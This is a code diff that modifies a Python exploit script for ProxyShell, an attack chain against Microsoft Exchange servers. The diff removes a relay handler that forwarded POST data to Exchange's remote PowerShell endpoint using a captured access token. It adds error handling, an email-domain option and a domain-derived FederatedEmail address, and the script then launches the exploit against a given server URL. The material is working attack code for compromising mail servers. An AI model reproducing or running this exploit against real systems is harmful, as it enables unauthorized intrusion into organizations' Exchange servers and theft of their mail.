@@ -22,34 +22,6 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
 
 
-class PwnServer(BaseHTTPRequestHandler):
-    def __init__(self, proxyshell, *args, **kwargs):
-        self.proxyshell = proxyshell
-        super().__init__(*args, **kwargs)
-
-    def do_POST(self):
-        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
-        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
-        length = int(self.headers['content-length'])
-        content_type = self.headers['content-type']
-        post_data = self.rfile.read(length).decode()
-
-        headers = {
-            'Content-Type': content_type
-        }
-
-        r = self.proxyshell.post(
-            powershell_url,
-            post_data,
-            headers
-        )
-
-        resp = r.content
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(resp)
-
-
 class ProxyShell:
 
     def __init__(self, exchange_url, email, verify=False):
@@ -114,10 +86,14 @@ class ProxyShell:
             headers
         )
 
-        autodiscover_xml = ET.fromstring(r.content)
-        self.legacydn = autodiscover_xml.find(
-            '{*}Response/{*}User/{*}LegacyDN'
-        ).text
+        try:
+            autodiscover_xml = ET.fromstring(r.content)
+            self.legacydn = autodiscover_xml.find(
+                '{*}Response/{*}User/{*}LegacyDN'
+            ).text
+        except AttributeError:
+            print('Wrong email? Not vulnerable?')
+            raise()
 
     def autodiscover_body(self):
 
@@ -156,6 +132,7 @@ def get_args():
 
     parser = argparse.ArgumentParser(description='ProxyShell example')
     parser.add_argument('-u', help='Exchange URL', required=True)
+    parser.add_argument('-d', help='Email domain')
     return parser.parse_args()
 
 
@@ -209,10 +186,12 @@ def get_emails(proxyshell):
 def main():
     args = get_args()
     exchange_url = args.u
+    domain = args.d if args.d else '.'.join(
+        exchange_url.split('.')[-2::]).rstrip('/')
 
     proxyshell = ProxyShell(
         exchange_url,
-        'FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@lab.local'
+        f'FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@{domain}'
     )
 
     exploit(proxyshell)
